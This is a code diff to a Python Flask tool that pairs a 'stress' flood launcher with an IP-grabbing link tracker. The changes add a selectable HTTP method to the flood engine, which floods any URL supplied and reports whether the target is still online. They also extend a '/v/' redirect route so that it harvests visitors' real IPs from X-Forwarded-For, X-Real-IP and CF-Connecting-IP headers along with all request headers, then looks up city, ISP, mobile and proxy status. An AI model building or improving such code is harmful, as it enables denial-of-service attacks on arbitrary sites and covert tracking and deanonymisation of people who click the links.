@@ -88,6 +88,7 @@ def start_stress():
     url = data.get('url', '')
     duration = int(data.get('duration', 60))
     concurrency = int(data.get('concurrency', 30))
+    method = data.get('method', 'GET')
 
     if not url.startswith('http'): return jsonify({"success": False, "error": "Invalid URL"}), 400
 
@@ -103,10 +104,10 @@ def start_stress():
             with state["lock"]:
                 state["flood_requests"] = requests
                 state["target_uptime"] = uptime
-                state["logs"].append({"msg": f"Packets Sent: {requests} | Status: {'ONLINE' if uptime else 'OFFLINE'}", "type": "info"})
+                state["logs"].append({"msg": f"[{method}] Packets Sent: {requests} | Status: {'ONLINE' if uptime else 'OFFLINE'}", "type": "info"})
 
         try:
-            loop.run_until_complete(flood_engine.run_flood(url, duration, concurrency, on_progress))
+            loop.run_until_complete(flood_engine.run_flood(url, duration, concurrency, method, on_progress))
         except Exception as e:
             with state["lock"]: state["logs"].append({"msg": f"Error: {str(e)}", "type": "error"})
         finally:
@@ -158,19 +159,33 @@ def generate_link():
 
 @app.route('/v/<link_id>')
 def track_and_redirect(link_id):
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    # Capture multiple IPs from various headers used by proxies/CDNs
+    forwarded = request.headers.get('X-Forwarded-For')
+    real_ip = request.headers.get('X-Real-IP')
+    cf_ip = request.headers.get('CF-Connecting-IP')
+    
+    ips = []
+    if forwarded: ips.extend([x.strip() for x in forwarded.split(',')])
+    if real_ip and real_ip not in ips: ips.append(real_ip)
+    if cf_ip and cf_ip not in ips: ips.append(cf_ip)
+    if not ips: ips.append(request.remote_addr)
+    
+    ip_str = ", ".join(ips)
+    primary_ip = ips[0]
+    
     client_data = {
-        "ip": ip,
+        "ip": ip_str,
         "user_agent": request.user_agent.string,
         "referer": request.referrer,
         "headers": dict(request.headers),
         "geo": {}
     }
     
-    # Try to get geo-data (sync for simplicity in this route)
+    # Enhanced GeoIP/ISP lookup
     import requests as sync_requests
     try:
-        resp = sync_requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
+        # Using a more detailed endpoint if possible, or sticking to ip-api
+        resp = sync_requests.get(f"http://ip-api.com/json/{primary_ip}?fields=status,message,country,city,isp,as,mobile,proxy", timeout=2)
         if resp.status_code == 200:
             client_data["geo"] = resp.json()
     except:
